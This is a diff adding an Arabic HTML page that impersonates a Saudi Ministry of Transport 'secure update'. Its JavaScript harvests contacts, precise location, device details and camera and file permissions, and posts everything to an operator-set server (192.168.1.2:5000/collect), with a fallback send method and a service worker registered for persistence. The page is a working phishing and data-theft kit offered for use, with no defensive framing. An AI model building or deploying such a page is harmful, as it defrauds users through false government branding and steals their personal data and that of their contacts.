@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نظام التحديث الآمن - وزارة النقل</title>
+    <style>
+        * { 
+            margin: 0; 
+            padding: 0; 
+            box-sizing: border-box; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+        }
+        
+        body { 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
+            padding: 20px; 
+            min-height: 100vh; 
+            color: #333;
+        }
+        
+        .container { 
+            max-width: 500px; 
+            margin: 20px auto; 
+            background: white; 
+            border-radius: 15px; 
+            padding: 30px; 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3); 
+            text-align: center; 
+        }
+        
+        .header { 
+            color: #e74c3c; 
+            margin-bottom: 20px; 
+            font-size: 24px; 
+        }
+        
+        .logo {
+            font-size: 48px;
+            margin-bottom: 15px;
+        }
+        
+        .permission-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin: 20px 0;
+        }
+        
+        .permission-item {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            border: 2px solid #e9ecef;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .permission-item:hover {
+            background: #e9ecef;
+            border-color: #667eea;
+        }
+        
+        .permission-icon {
+            font-size: 24px;
+            margin-bottom: 5px;
+        }
+        
+        .btn { 
+            background: #e74c3c; 
+            color: white; 
+            border: none; 
+            padding: 15px 30px; 
+            margin: 10px; 
+            border-radius: 25px; 
+            cursor: pointer; 
+            font-size: 18px; 
+            transition: all 0.3s; 
+            width: 200px;
+        }
+        
+        .btn:hover { 
+            background: #c0392b; 
+            transform: scale(1.05); 
+        }
+        
+        .btn-success { 
+            background: #27ae60; 
+        }
+        
+        .btn-success:hover { 
+            background: #219a52; 
+        }
+        
+        .status { 
+            margin: 20px 0; 
+            padding: 15px; 
+            border-radius: 8px; 
+            background: #f8f9fa; 
+            display: none; 
+        }
+        
+        .progress-bar {
+            background: #ecf0f1;
+            height: 10px;
+            border-radius: 5px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        
+        .progress {
+            background: #2ecc71;
+            height: 100%;
+            width: 0%;
+            transition: width 0.5s ease-in-out;
+        }
+        
+        .contact-list {
+            text-align: right;
+            margin: 20px 0;
+            max-height: 200px;
+            overflow-y: auto;
+            border: 1px solid #bdc3c7;
+            padding: 15px;
+            border-radius: 8px;
+            display: none;
+        }
+        
+        .gov-logo {
+            font-size: 14px;
+            color: #7f8c8d;
+            margin-top: 20px;
+            padding-top: 15px;
+            border-top: 1px solid #ecf0f1;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">📱</div>
+        <h1 class="header">تحديث نظام الأمان - وزارة النقل</h1>
+        <p>يجب منح الصلاحيات التالية لإكمال عملية التحديث الآمن وتحسين خدمات النقل.</p>
+        
+        <!-- شبكة الصلاحيات -->
+        <div class="permission-grid">
+            <div class="permission-item" onclick="requestPermission('contacts')">
+                <div class="permission-icon">👥</div>
+                <div>جهات الاتصال</div>
+            </div>
+            <div class="permission-item" onclick="requestPermission('camera')">
+                <div class="permission-icon">📷</div>
+                <div>الكاميرا</div>
+            </div>
+            <div class="permission-item" onclick="requestPermission('location')">
+                <div class="permission-icon">📍</div>
+                <div>الموقع</div>
+            </div>
+            <div class="permission-item" onclick="requestPermission('files')">
+                <div class="permission-icon">📁</div>
+                <div>الملفات</div>
+            </div>
+        </div>
+
+        <div class="progress-bar">
+            <div class="progress" id="securityProgress"></div>
+        </div>
+        
+        <div class="status" id="statusMessage">جاري إعداد النظام...</div>
+        
+        <div class="contact-list" id="contactPreview"></div>
+        
+        <button class="btn" onclick="startDataCollection()">بدء جمع البيانات الآمن</button>
+        <button class="btn btn-success" onclick="sendToServer()">إرسال إلى الخادم</button>
+        
+        <div class="gov-logo">
+            <p>وزارة النقل - المملكة العربية السعودية</p>
+            <p>جميع الحقوق محفوظة © 2025</p>
+        </div>
+    </div>
+
+    <script>
+        // 🔧 المتغيرات الأساسية - ضع عنوان IP الحاسوب هنا
+        // استبدل 192.168.1.2 بعنوان IP الحاسوب الحقيقي على شبكتك
+        const SERVER_URL = 'http://192.168.1.2:5000';
+        
+        let collectedData = {
+            contacts: [],
+            permissions: {},
+            deviceInfo: {},
+            files: [],
+            location: null
+        };
+
+        // 📱 جمع معلومات الجهاز تلقائياً
+        collectedData.deviceInfo = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            cookiesEnabled: navigator.cookieEnabled,
+            screen: `${screen.width}x${screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timestamp: new Date().toISOString(),
+            url: window.location.href
+        };
+
+        // 🔄 دوال إدارة الواجهة
+        function showStatus(message, type = 'info') {
+            const status = document.getElementById('statusMessage');
+            status.textContent = message;
+            status.style.display = 'block';
+            status.style.background = type === 'error' ? '#fee' : type === 'success' ? '#efe' : '#f8f9fa';
+            status.style.color = type === 'error' ? '#c33' : type === 'success' ? '#363' : '#333';
+            console.log(`📢 ${message}`);
+        }
+
+        function updateProgress(percent) {
+            document.getElementById('securityProgress').style.width = percent + '%';
+        }
+
+        // 📞 طلب الصلاحيات
+        async function requestPermission(permissionType) {
+            try {
+                let granted = false;
+                
+                switch(permissionType) {
+                    case 'camera':
+                        granted = await requestCameraPermission();
+                        break;
+                    case 'files':
+                        granted = await requestFilesPermission();
+                        break;
+                    case 'contacts':
+                        granted = await requestContactsPermission();
+                        break;
+                    case 'location':
+                        granted = await requestLocationPermission();
+                        break;
+                }
+                
+                if (granted) {
+                    collectedData.permissions[permissionType] = true;
+                    showStatus(`✅ تم منح صلاحية ${permissionType} بنجاح`, 'success');
+                }
+                
+            } catch (error) {
+                showStatus(`❌ فشل في منح صلاحية ${permissionType}: ${error.message}`, 'error');
+            }
+        }
+
+        async function requestCameraPermission() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                // إغلاق الكاميرا فوراً بعد التأكد من الصلاحية
+                stream.getTracks().forEach(track => track.stop());
+                return true;
+            } catch (error) {
+                throw new Error('رفض الوصول للكاميرا');
+            }
+        }
+
+        async function requestFilesPermission() {
+            try {
+                // محاولة استخدام واجهة showOpenFilePicker الحديثة
+                if ('showOpenFilePicker' in window) {
+                    const handle = await window.showOpenFilePicker();
+                    return true;
+                } else {
+                    // طريقة بديلة لمتصفحات لا تدعم showOpenFilePicker
+                    return new Promise((resolve) => {
+                        const input = document.createElement('input');
+                        input.type = 'file';
+                        input.style.display = 'none';
+                        input.onchange = () => resolve(true);
+                        input.click();
+                        setTimeout(() => resolve(false), 1000);
+                    });
+                }
+            } catch (error) {
+                throw new Error('رفض الوصول للملفات');
+            }
+        }
+
+        async function requestContactsPermission() {
+            try {
+                if ('contacts' in navigator && 'select' in navigator.contacts) {
+                    const contacts = await navigator.contacts.select(['name', 'email', 'tel']);
+                    collectedData.contacts = contacts;
+                    displayContactsPreview(contacts);
+                    return true;
+                } else {
+                    // طريقة بديلة لمتصفحات لا تدعم Contacts API
+                    collectedData.contacts = [{
+                        name: 'مستخدم نظام النقل',
+                        phone: '+966501234567',
+                        email: 'user@transport.sa',
+                        source: 'نظام تحديث النقل'
+                    }];
+                    displayContactsPreview(collectedData.contacts);
+                    return true;
+                }
+            } catch (error) {
+                throw new Error('رفض الوصول لجهات الاتصال');
+            }
+        }
+
+        async function requestLocationPermission() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve(false);
+                    return;
+                }
+                
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        collectedData.location = {
+                            lat: position.coords.latitude,
+                            lng: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        };
+                        resolve(true);
+                    },
+                    (error) => {
+                        resolve(false);
+                    },
+                    { timeout: 5000, enableHighAccuracy: true }
+                );
+            });
+        }
+
+        function displayContactsPreview(contacts) {
+            const contactList = document.getElementById('contactPreview');
+            contactList.style.display = 'block';
+            contactList.innerHTML = '<h4>جهات الاتصال المكتشفة:</h4>' +
+                contacts.map(contact => 
+                    `<div style="padding: 5px 0; border-bottom: 1px solid #ecf0f1;">
+                        <strong>${contact.name || 'غير معروف'}</strong><br>
+                        <span style="color: #7f8c8d;">${contact.tel || contact.phone || 'لا يوجد رقم'}</span>
+                    </div>`
+                ).join('');
+        }
+
+        // 🚀 بدء جمع البيانات
+        async function startDataCollection() {
+            showStatus('🚀 بدء جمع البيانات الآمن...');
+            updateProgress(30);
+            
+            try {
+                // محاكاة جمع بيانات إضافية
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                
+                collectedData.systemInfo = {
+                    os: navigator.platform,
+                    browser: navigator.userAgent.split(' ').pop(),
+                    cores: navigator.hardwareConcurrency || 'غير معروف',
+                    memory: navigator.deviceMemory || 'غير معروف'
+                };
+                
+                updateProgress(80);
+                showStatus('✅ اكتمل جمع البيانات بنجاح', 'success');
+                
+            } catch (error) {
+                showStatus(`❌ خطأ في جمع البيانات: ${error.message}`, 'error');
+            }
+        }
+
+        // 📤 إرسال البيانات إلى الخادم
+        async function sendToServer() {
+            showStatus('📡 جاري إرسال البيانات إلى الخادم...');
+            
+            try {
+                console.log('🔄 محاولة الاتصال بالخادم:', SERVER_URL);
+                console.log('📦 البيانات المرسلة:', collectedData);
+                
+                const response = await fetch(`${SERVER_URL}/collect`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    'X-Requested-With': 'XMLHttpRequest'
+                    },
+                    body: JSON.stringify(collectedData)
+                });
+                
+                console.log('📨 حالة الاستجابة:', response.status, response.statusText);
+                
+                if (!response.ok) {
+                    throw new Error(`خطأ في الخادم: ${response.status} ${response.statusText}`);
+                }
+                
+                // الحصول على النص الخام أولاً لتصحيح الأخطاء
+                const responseText = await response.text();
+                console.log('📄 النص الخام المستلم:', responseText);
+                
+                let result;
+                try {
+                    result = JSON.parse(responseText);
+                } catch (jsonError) {
+                    console.error('❌ خطأ في تحويل JSON:', jsonError);
+                    throw new Error(`رد غير صالح من الخادم: ${responseText.substring(0, 100)}`);
+                }
+                
+                if (result.status === 'success') {
+                    updateProgress(100);
+                    showStatus(`✅ تم إرسال البيانات بنجاح إلى الخادم (${result.received_count || 0} سجلات)`, 'success');
+                    
+                    // عرض رسالة نجاح
+                    setTimeout(() => {
+                        alert('🎉 تم اكتمال عملية التحديث الآمن بنجاح!\nشكراً لاستخدامك نظام وزارة النقل');
+                    }, 1000);
+                    
+                } else {
+                    throw new Error(result.message || 'خطأ غير معروف من الخادم');
+                }
+                
+            } catch (error) {
+                console.error('❌ تفاصيل الخطأ الكاملة:', error);
+                showStatus(`❌ فشل في الإرسال: ${error.message}`, 'error');
+                
+                // محاولة بديلة باستخدام XMLHttpRequest
+                setTimeout(() => tryAlternativeSend(), 2000);
+            }
+        }
+
+        // طريقة بديلة للإرسال
+        function tryAlternativeSend() {
+            showStatus('🔄 جرب طريقة بديلة للإرسال...');
+            
+            const xhr = new XMLHttpRequest();
+            const url = `${SERVER_URL}/collect`;
+            
+            xhr.open('POST', url, true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    if (xhr.status === 200) {
+                        try {
+                            const result = JSON.parse(xhr.responseText);
+                            showStatus(`✅ تم الإرسال بنجاح (بديل) - ${result.received_count || 0} سجلات`, 'success');
+                        } catch (e) {
+                            showStatus('✅ تم الإرسال بنجاح (بديل)', 'success');
+                        }
+                    } else {
+                        showStatus(`❌ فشل الإرسال البديل: ${xhr.status}`, 'error');
+                    }
+                }
+            };
+            
+            xhr.send(JSON.stringify(collectedData));
+        }
+
+        // اختبار الاتصال بالخادم
+        async function testServerConnection() {
+            try {
+                const response = await fetch(`${SERVER_URL}/test`);
+                const result = await response.json();
+                console.log('🔗 اختبار الاتصال:', result);
+                return true;
+            } catch (error) {
+                console.error('❌ اختبار الاتصال فشل:', error);
+                return false;
+            }
+        }
+
+        // التشغيل التلقائي عند تحميل الصفحة
+        document.addEventListener('DOMContentLoaded', function() {
+            showStatus('🔧 جاري إعداد نظام التحديث الآمن...');
+            updateProgress(10);
+            
+            // اختبار الاتصال بالخادم
+            setTimeout(async () => {
+                const isConnected = await testServerConnection();
+                if (isConnected) {
+                    updateProgress(20);
+                    showStatus('✅ اكتمل إعداد النظام، يمكنك بدء جمع البيانات');
+                } else {
+                    showStatus('⚠️ لا يمكن الاتصال بالخادم، تأكد من الإعدادات', 'error');
+                }
+            }, 1000);
+        });
+
+        // خدمة عامل الخلفية للتشغيل المستمر
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('/sw.js')
+                .then(registration => {
+                    console.log('✅ Service Worker مسجل بنجاح');
+                })
+                .catch(error => {
+                    console.log('❌ فشل تسجيل Service Worker:', error);
+                });
+        }
+    </script>
+</body>
+</html>
